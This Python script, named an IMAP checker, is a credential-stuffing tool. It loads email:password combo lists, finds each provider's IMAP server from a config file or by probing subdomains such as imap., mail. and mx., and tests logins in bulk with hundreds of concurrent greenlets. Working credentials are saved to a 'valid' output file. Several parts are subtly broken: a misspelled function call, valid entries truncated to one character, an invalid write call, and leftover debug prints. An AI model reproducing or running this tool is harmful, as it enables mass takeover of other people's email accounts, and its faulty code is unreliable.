import os
import time
from timeit import default_timer as timer
import gevent.monkey
gevent.monkey.patch_all()

import gevent
from gevent.queue import Queue
from gevent.event import Event


import imaplib
import itertools
import argparse
import signal
import socket
import re

def display():
    os.system(clear)
    print('%s/%s\nVALID : %s, INVALID %s' % (count, par1, valid_count, invalid_count))

def imap(usr, pw, host):
    socket.setdefaulttimeout(time_out)
    usr = usr.lower()
    try:
        if len(host) < 2:
            port = 993 
        else:
            port = int(host[1])
        # print(host[0], port)

        mail = imaplib.IMAP4_SSL(str(host[0]), port)
        try:
            a = str(mail.login(usr, pw))
            return a[2:4]
        except imaplib.IMAP4.error as e:
            return False
    except BaseException as e:
        return "ERROR"

def get_imapconfig(email):
    try:
        hoster = email.lower().split('@')[1]
        return imap_config[hoster]
    except BaseException as e:
        return False

def handler(signum, frame):
    print("\n[INFO] Shutting down (wait a minute)")
    evt.set()

def blocks(files, size=65536):
    print("BLOCKS")
    while True:
        b = files.read(size)
        if not b:
            break
        yield b

def get_lastline():
    print("LSAST LINE")
    try:
        with open('last_line.log', 'r') as text_file:
            for line in text_file:
                if int(line.strip()) < 1:
                    return 0
                else:
                    return int(line.strip())
    except BaseException as e:
        return 0

def loader():
    print("LOADER")
    try:
        global par1
        par1 = 0
        if resumer:
            par1 = get_lastline()
        with open(file_in, 'r') as text_file:
            pid = par1
            for line in itertools.islice(text_file, par1, None):
                line = re.search('.+@.+\.\w+:.+', line.strip())
                if line:
                    par1 += 1
                    q.put(line[0])
    except IOError:
        print("[Error] No input file", file_in, "found!")
    except BaseException as e:
        pass

# load imap queries from file #yes
def init_imap_config():
    print("INIT IMAP OCNIFG")
    global imap_config
    imap_config = {}
    try:
        # locate manual your hoster.dat
        with open('../config/hoster.dat', 'r') as f:
            for line in f.readlines():
                line = line.strip().split(":")
                if len(line) > 2:
                    imap_config[line[0]] = (line[1], line[2])
    except BaseException:
        print("[Error] Hoster.dat not found!")

# WRITER 

def writer_valid():
    try:
        with open(file_out, 'a') as f:
            # sen_count = workers
            while not q_valid.empty():
                t = q_valid.get(block=True)
                f.write(t + "\n")
    except BaseException as e:
        pass

def writer_invalid():
    if invunma:
        try:
            with open(file_out[:-4] + "_invalid.txt", "a") as f:
                while not q_invalid.empty():
                    t = q_invalid.get(block=True)
                    f.write(t+"\n")
        except:
            pass

def getunkwnown_imap(subb):
    print("GET UNKNOWN IMAP")
    socket.setdefaulttimeout(time_out)
    try:
        sub = [
        'imap',
        'mail',
        'pop',
        'pop3',
        'imap-mail',
        'inbound',
        'mx',
        'imaps',
        'smtp',
        'm'
        ]
        for host in sub:
            host = host + '.' + subb
            try:
                mail = imaplib.IMAP4_SSL(str(host))
                mail.login('test', 'test')
            except imaplib.IMAP4.error:
                return host
    except BaseException as e:
        return None

def unmatch_host(host):
    print("UNMATCH HOST")
    try:
        host = host.split("@")
        v = getunknown_imap(host)
        if v:
            with open('hoster.dat', 'a') as myfile:
                myfile.write('\n', + host + ":" + v + ":993")
                imap_config[host] = v
            return v
        return False
    except BaseException as e:
        return False

def sub_worker(t):
    # print("SUB_WORKER", t)
    global valid_count
    global invalid_count

    task = t.split(":")
    host = get_imapconfig(task[0])
    if not host:
        return
        # if scan_unknown_host:
        #     host = unmatch_host(task[0])
        # if not host:
        #     q_invalid.put(t)
        #     return
    l = imap(task[0], task[1], host)
    print("ILANG")
    if l == "OK":
        valid_count += 1
        q_valid.put(t[0])

    if not l:
        invalid_count += 1
        if invunma:
            q_invalid.put(t[0])
        return

def worker(worker_id):
    global count
    try:
        while not evt.is_set() or not q.empty():
            count += 1
            t = q.get(block=True, timeout=2)
            sub_worker(t)
            display()
    except BaseException as e:
        display()
        
# gevent async logic, spawning consumer greenlets
def asynchronous():
    threads = []
    threads.append(gevent.spawn(loader))
    for i in range(0, workers):
        threads.append(gevent.spawn(worker, i))
    threads.append(gevent.spawn(writer_valid))
    if invunma:
        threads.append(gevent.spawn(writer_invalid))
    start = timer()
    gevent.joinall(threads)
    end = timer()

    print("[INFO] Time elapsed: " + str(end - start)[:5], "seconds.")
    print("[INFO] Done.")
    evt.set()

parser = argparse.ArgumentParser(description='Atlantr Imap Checker py3')
parser.add_argument(
    '-i',
    '--input',
    help='input file',
    required=True,
    type=str,
    )

parser.add_argument(
    '-o',
    '--output',
    help='output file',
    required=False,
    type=str,
    default='mail_pass_valid.txt'
    )
parser.add_argument(
    '-t',
    '--threads',
    help='Number of greenlets spawned',
    required=False,
    type=int,
    default="500"
    )
parser.add_argument(
    '-iu',
    '--invunma',
    help='log invalid an unmatched accounts',
    required=False,
    type=bool,
    default=False
    )
parser.add_argument(
    '-to',
    '--timeout',
    help='Resume from last line',
    required=False,
    type=int,
    default=5,
    )
parser.add_argument(
    '-r',
    '--resume',
    help="Resume from last line?",
    required=False,
    type=bool,
    default=False
    )
parser.add_argument(
    '-uh',
    '--unknownhosts',
    help='Check for unknown hosts',
    required=False,
    type=bool,
    default=True
    )

args = vars(parser.parse_args())

count = 0
valid_count = 0
invalid_count = 0
clear = 'clear' if os.name == 'posix' else 'cls'

file_in = args['input']
file_out = args['output']
workers = args['threads']
invunma = args['invunma']
time_out = args['timeout']
resumer = args['resume']
scan_unknown_host = args['unknownhosts']


evt = Event()
signal.signal(signal.SIGINT, handler)

init_imap_config()

q = gevent.queue.Queue()
q_valid = gevent.queue.Queue()
if invunma:
    q_invalid = gevent.queue.Queue()
try:
    asynchronous()
except Exception as e:
    print(e)
    pass